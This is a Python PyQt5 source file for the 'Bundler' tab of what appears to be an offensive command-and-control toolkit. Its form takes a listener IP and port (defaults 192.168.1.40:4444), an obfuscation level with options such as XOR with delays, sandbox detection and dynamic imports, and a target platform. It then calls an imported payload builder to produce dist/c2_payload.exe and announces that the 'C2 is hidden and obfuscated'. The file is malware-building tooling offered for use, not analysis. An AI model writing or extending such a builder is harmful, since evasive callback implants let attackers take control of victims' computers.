#!/usr/bin/env python3
"""Bundler Tab - C2 Payload Bundler"""

import sys
from pathlib import Path
from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QMessageBox,
    QProgressBar,
    QGroupBox,
    QSpinBox,
    QTextEdit,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont


class BundlerWorker(QThread):
    """Worker thread for bundling"""

    progress = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(self, listener_ip, listener_port, obfuscation, platform="windows"):
        super().__init__()
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation = obfuscation
        self.platform = platform

    def run(self):
        try:
            try:
                obfuscation_level = int(self.obfuscation)
            except:
                obfuscation_map = {
                    "Level 1": 1,
                    "Level 2": 2,
                    "Level 3": 3,
                    "Level 4": 4,
                    "Level 5": 5,
                }
                obfuscation_level = 2
                for key, val in obfuscation_map.items():
                    if key in str(self.obfuscation):
                        obfuscation_level = val
                        break

            self.progress.emit("[*] === C2 BUNDLER ===")
            self.progress.emit(f"[*] Listener: {self.listener_ip}:{self.listener_port}")
            self.progress.emit(f"[*] Obfuscation: Level {obfuscation_level}")
            self.progress.emit(f"[*] Platform: {self.platform}")
            self.progress.emit("")

            sys.path.insert(0, str(Path(__file__).parent))
            from c2_bundler_simple import create_bundled_payload

            self.progress.emit("[*] Creating C2 payload...")
            success = create_bundled_payload(
                self.listener_ip, self.listener_port, obfuscation_level, self.platform
            )

            if success:
                self.progress.emit("")
                self.progress.emit("[+] SUCCESS!")
                self.progress.emit("[+] Location: dist/c2_payload.exe")
                self.progress.emit("[+] C2 is hidden and obfuscated!")
                self.finished.emit(True)
            else:
                self.progress.emit("[!] FAILED")
                self.finished.emit(False)

        except Exception as e:
            self.progress.emit(f"[!] ERROR: {str(e)}")
            import traceback

            self.progress.emit(traceback.format_exc())
            self.finished.emit(False)


class BundlerTab(QWidget):
    """Bundler interface"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.bundler_worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Configuration
        config_group = QGroupBox("⚙️ Configuration")
        config_layout = QVBoxLayout()

        ip_layout = QHBoxLayout()
        ip_layout.addWidget(QLabel("Listener IP:"))
        self.listener_ip_input = QLineEdit()
        self.listener_ip_input.setText("192.168.1.40")
        ip_layout.addWidget(self.listener_ip_input)
        config_layout.addLayout(ip_layout)

        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("Listener Port:"))
        self.listener_port_spinbox = QSpinBox()
        self.listener_port_spinbox.setValue(4444)
        self.listener_port_spinbox.setMinimum(1)
        self.listener_port_spinbox.setMaximum(65535)
        port_layout.addWidget(self.listener_port_spinbox)
        config_layout.addLayout(port_layout)

        obf_layout = QHBoxLayout()
        obf_layout.addWidget(QLabel("Obfuscation:"))
        self.obfuscation_combo = QComboBox()
        self.obfuscation_combo.addItems(
            [
                "Level 1 - Base64",
                "Level 2 - XOR + Delays (RECOMMENDED)",
                "Level 3 - Sandbox Detection",
                "Level 4 - Dynamic Imports",
                "Level 5 - MAXIMUM",
            ]
        )
        self.obfuscation_combo.setCurrentIndex(1)
        obf_layout.addWidget(self.obfuscation_combo)
        config_layout.addLayout(obf_layout)

        plat_layout = QHBoxLayout()
        plat_layout.addWidget(QLabel("Platform:"))
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows (.exe)", "macOS (.app)", "Linux"])
        plat_layout.addWidget(self.platform_combo)
        config_layout.addLayout(plat_layout)

        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # Bundler Button
        button_layout = QHBoxLayout()
        self.bundle_btn = QPushButton("🔨 Start Bundling")
        self.bundle_btn.setStyleSheet(
            "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
        )
        self.bundle_btn.clicked.connect(self.start_bundling)
        button_layout.addWidget(self.bundle_btn)
        layout.addLayout(button_layout)

        # Progress
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)

        # Output
        output_group = QGroupBox("📊 Output")
        output_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 9))
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)

        self.setLayout(layout)

    def start_bundling(self):
        listener_ip = self.listener_ip_input.text().strip()
        listener_port = self.listener_port_spinbox.value()

        if not listener_ip:
            QMessageBox.warning(self, "Error", "Enter listener IP")
            return

        if listener_port <= 0 or listener_port > 65535:
            QMessageBox.warning(self, "Error", "Invalid port")
            return

        self.bundle_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.output_text.clear()

        platform_map = {
            "Windows (.exe)": "windows",
            "macOS (.app)": "macos",
            "Linux": "linux",
        }
        platform = platform_map.get(self.platform_combo.currentText(), "windows")

        self.bundler_worker = BundlerWorker(
            listener_ip, listener_port, self.obfuscation_combo.currentText(), platform
        )

        self.bundler_worker.progress.connect(self.on_progress)
        self.bundler_worker.finished.connect(self.on_finished)
        self.bundler_worker.start()

    def on_progress(self, message):
        self.output_text.append(message)

    def on_finished(self, success):
        self.bundle_btn.setEnabled(True)
        self.progress_bar.setVisible(False)

        if success:
            QMessageBox.information(
                self, "Success", "Payload created!\n\nLocation: dist/c2_payload.exe"
            )
        else:
            QMessageBox.critical(self, "Error", "Bundling failed")


# Usage: Bundler Tab → Config → "Start Bundling"
#        → dist/c2_payload.exe